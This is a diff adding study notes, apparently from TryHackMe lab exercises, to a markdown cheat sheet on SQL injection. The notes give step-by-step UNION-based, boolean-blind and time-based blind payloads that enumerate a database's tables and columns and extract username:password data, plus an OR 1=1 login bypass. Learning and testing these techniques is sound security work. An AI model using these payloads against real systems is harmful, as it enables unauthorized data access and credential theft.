@@ -256,3 +256,41 @@ SQL Injection - Exploits that allow users to modify or read from an SQL Database
 - `SELECT * from blog where id=param and private=0 LIMIT 1;`
     - Exploit - `https://example.com/page?param=1;--`
     - Command - `SELECT * from blog where id=1;-- and private=0 LIMIT 1;`
+
+### In-Band SQLi Process
+- `https://example.com/page?param=1 UNION SELECT 1;--` - Find amount of columns
+- `https://example.com/page?param=1 UNION SELECT 1,2;--` - Add more until error goes away
+- `https://example.com/page?param=0 UNION SELECT 1,2,3;--` - Make first query return nothing so SQL data is returned
+- `https://example.com/page?param=0 UNION SELECT 1,2,database();--` - Find name of database
+- `https://example.com/page?param=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = NAME;--` - Find table names
+- `https://example.com/page?param=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = TABLE_NAME;--` - Find columns
+- `https://example.com/page?param=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM TABLE_NAME;--` - Return data from columns
+
+### Blind SQLi Authentication Bypass
+- `select * from users where username='' and password='' OR 1=1;`
+
+### Boolean Blind SQLi Process
+Find exploit to return 2 different values depending on error
+
+- `https://website.thm/checkuser?username=admin` - Returns taken:true
+- `https://website.thm/checkuser?username=admin123` - Returns taken:false
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1;--` - Returns taken:false meaning there is an error
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2;--` - Add more until error goes away
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;--` - Returns taken:true. Correct amount of columns
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'a%';--` - Returns taken:false. Database name does not start with 'a'
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like NAME;--` - Bruteforce letters until entire database name uncovered
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE TABLE_SCHEMA=NAME and table_name like 'a%';--` - Returns taken:false. Table name(s) do not start with 'a'
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME;--` - Bruteforce letters until entire table name uncovered
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME and column_name like 'a%';--` - Returns taken:false. column name(s) do not start with 'a'
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME and column_name like COLUMN_NAME1;--` - Bruteforce letters until entire column name uncovered
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME and column_name like 'a%' and column_name != COLUMN_NAME1;--` - Returns taken:false. column name(s) do not start with 'a'
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=NAME and table_name like TABLE_NAME and column_name like COLUMN_NAME2 and column_name != COLUMN_NAME1;--` - Bruteforce letters until entire column name uncovered
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM TABLE_NAME where COLUMN_NAME1 like 'a%';--` - Returns taken:true. some data starts with 'a'
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM TABLE_NAME where COLUMN_NAME1 like DATA1 and COLUMN_NAME2 like 'a%';--` - Returns taken:false. no data starts with 'a'
+- `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM TABLE_NAME where COLUMN_NAME1 like DATA and COLUMN_NAME2 like DATA2;--` - Bruteforce letters until all data revealed
+
+### Time Based Blidn SQLi Process
+- Same as Boolean based, but calls to Union Select should start with `UNION SELECT SLEEP(1)`
+  - If the time taken to return data is less than 1 second, 0 results matches query
+  - If the time taken to return data is ~1 second, 1 result matches query
+  - If the time taken to return data is ~X seconds, X results matches query
